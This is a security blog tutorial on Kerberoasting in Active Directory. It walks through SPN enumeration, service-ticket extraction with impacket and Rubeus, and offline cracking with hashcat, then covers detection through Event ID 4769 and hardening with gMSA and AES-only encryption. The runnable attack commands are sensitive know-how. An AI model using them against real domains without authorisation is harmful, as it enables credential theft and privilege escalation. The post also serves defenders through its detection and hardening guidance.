---
title: "Active Directory Attacks: Kerberoasting Deep Dive"
slug: "active-directory-kerberoasting-deep-dive"
description: "Kerberoasting end-to-end — TGS ticket extraction, hashcat cracking, defensive detection (Event ID 4769), and modern hardening with gMSA and AES."
date: 2026-04-20T11:00:00Z
lastmod: 2026-04-20T11:00:00Z
draft: false
author: "CyberSecurity Elite Team"
categories: ["Network Security"]
tags: ["active directory", "kerberoasting", "kerberos", "windows", "red team"]
keywords: ["kerberoasting", "kerberoasting tutorial", "kerberos attacks", "spn enumeration"]
toc: true
cover:
  image: "/images/og-default.svg"
  alt: "Kerberoasting deep dive"
---

Kerberoasting remains the highest-ROI Active Directory attack: any authenticated domain user can request a service ticket for any account with a Service Principal Name (SPN), and crack that ticket offline. No special privileges. No exploits. Just Kerberos working as designed.

## The Protocol Detail That Makes It Work

When a user requests a service ticket (TGS), the KDC encrypts a portion of the ticket with the **service account's password hash**. Anyone authenticated can request a TGS for any SPN. So:

1. Enumerate accounts with SPNs.
2. Request TGS tickets for them.
3. Extract the encrypted blob.
4. Crack the password offline.

The only protection against step 4 is a strong password — and service account passwords are notoriously weak.

## Enumeration

From a domain-joined Windows host:

{{< terminal title="domain user @ workstation" >}}
PS> setspn -T contoso.local -Q */*
CN=svc_sql,OU=Service Accounts,DC=contoso,DC=local
    MSSQLSvc/sql01.contoso.local:1433
CN=svc_iis,OU=Service Accounts,DC=contoso,DC=local
    HTTP/web01.contoso.local
{{< /terminal >}}

From Linux with credentials:

{{< terminal title="kali@kali" >}}
$ GetUserSPNs.py contoso.local/user:'Password1' -dc-ip 10.0.0.10
ServicePrincipalName    Name      MemberOf
MSSQLSvc/sql01:1433     svc_sql   CN=Domain Admins,...
{{< /terminal >}}

That `Domain Admins` membership is the prize. Many real environments have at least one SPN-bearing account that ended up over-privileged through legacy delegation.

## Extracting the Ticket

```bash
GetUserSPNs.py contoso.local/user:'Password1' -dc-ip 10.0.0.10 -request \
  -outputfile spn_hashes.txt
```

Or from a Windows session:

```powershell
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken `
  -ArgumentList "MSSQLSvc/sql01.contoso.local:1433"
# Then dump with Rubeus or mimikatz
Rubeus.exe kerberoast /outfile:hashes.txt
```

## Cracking

```bash
hashcat -m 13100 spn_hashes.txt /usr/share/wordlists/rockyou.txt -r rules/best64.rule
```

`-m 13100` is the Kerberos 5 TGS-REP etype 23 mode (RC4-HMAC). If the domain enforces AES-only (etype 17/18), use mode `19700`/`19600` — substantially slower but still tractable for weak passwords.

## Detection

The single most important signal is **Event ID 4769** on Domain Controllers:

```text
Account Name: bob@contoso.local
Service Name: svc_sql
Ticket Encryption Type: 0x17  <-- RC4-HMAC, suspicious
```

Hunt query (Splunk-style):

```spl
index=windows EventCode=4769 Ticket_Encryption_Type=0x17
| stats count by Account_Name, Service_Name
| where count > 5
```

Modern attackers know this and request only one ticket per service. Effective detection combines:

- **RC4 ticket requests** to AES-capable services (anomaly)
- **Single user requesting many distinct SPNs** within a short window
- **Honeytoken SPN** — an unused account with an SPN; any TGS request for it is automatically suspicious

## Hardening

1. **Use Group Managed Service Accounts (gMSA)** — passwords are auto-rotated, 240 bytes, and never readable by humans. Kerberoastable hashes from a gMSA are functionally uncrackable.
2. **Enforce AES-only encryption** on service accounts. Set `msDS-SupportedEncryptionTypes = 0x18`.
3. **Long, random passwords** (>25 chars) on legacy service accounts that cannot move to gMSA.
4. **Audit SPN coverage quarterly** — orphaned SPNs accumulate over years.

## References

- [MITRE ATT&CK T1558.003 — Kerberoasting](https://attack.mitre.org/techniques/T1558/003/)
- [Microsoft: gMSA Overview](https://learn.microsoft.com/en-us/windows-server/security/group-managed-service-accounts/group-managed-service-accounts-overview)
- [Rubeus Documentation](https://github.com/GhostPack/Rubeus)
